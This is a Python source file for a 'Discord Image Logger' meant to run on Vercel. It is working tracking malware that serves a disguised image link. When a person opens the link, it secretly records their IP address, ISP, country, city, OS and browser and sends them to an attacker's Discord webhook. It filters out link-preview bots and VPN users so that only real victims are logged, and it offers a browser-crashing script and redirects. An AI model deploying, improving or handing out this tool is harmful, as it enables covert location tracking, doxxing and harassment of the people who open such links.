# Discord Image Logger - Vercel Version
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    "webhook": "paste in your webhook",
    "image": "https://media.tenor.com/nxA3aEorH00AAAAM/aaa.gif",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{"title": "Image Logger - Error", "color": config["color"], "description": f"```\n{error}\n```"}]
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None):
    if not ip or ip.startswith(blacklistedIPs):
        return None

    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [{"title": "Image Logger - Link Sent", "color": config["color"], "description": f"Endpoint: `{endpoint}`\nIP: `{ip}`\nPlatform: `{bot}`"}]
            })
        return None

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    ping = "@everyone"

    # VPN & Hosting Checks
    if info.get("proxy"):
        if config["vpnCheck"] == 2: return None
        if config["vpnCheck"] == 1: ping = ""
    if info.get("hosting"):
        if config["antiBot"] in [3, 4]: return None
        if config["antiBot"] in [1, 2]: ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**
**Endpoint:** `{endpoint}`
**IP:** `{ip}`
**Provider:** `{info.get('isp', 'Unknown')}`
**Country:** `{info.get('country', 'Unknown')}`
**City:** `{info.get('city', 'Unknown')}`
**OS:** `{os_name}` | **Browser:** `{browser}`"""
        }]
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    requests.post(config["webhook"], json=embed)
    return info


# ←←← WICHTIG: Klasse muss genau "handler" heißen
class handler(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            # URL Parameter für Custom Image
            query = parse.urlsplit(self.path).query
            params = dict(parse.parse_qsl(query))
            
            if config["imageArgument"] and (params.get("url") or params.get("id")):
                try:
                    img_param = params.get("url") or params.get("id")
                    image_url = base64.b64decode(img_param.encode()).decode()
                except:
                    image_url = config["image"]
            else:
                image_url = config["image"]

            ip = self.headers.get('x-forwarded-for')

            # Discord/Telegram Bot Check
            if botCheck(ip, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                if config["buggedImage"]:
                    self.send_header('Content-type', 'image/jpeg')
                    self.end_headers()
                    self.wfile.write(binaries["loading"])
                else:
                    self.send_header('Location', image_url)
                    self.end_headers()
                makeReport(ip, endpoint=self.path.split("?")[0], url=image_url)
                return

            # Normalen User loggen
            makeReport(ip, self.headers.get('user-agent'), endpoint=self.path.split("?")[0], url=image_url)

            # HTML Response
            html = f'''<style>body{{margin:0;padding:0}}div.img{{background:url('{image_url}') center center no-repeat;background-size:contain;width:100vw;height:100vh}}</style><div class="img"></div>'''

            if config["message"]["doMessage"]:
                html = config["message"]["message"]

            if config["crashBrowser"]:
                html += '<script>setTimeout(()=>{for(let i=69420;i==i;i*=i)console.log(i)},100)</script>'

            if config["redirect"]["redirect"]:
                html = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())

        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest
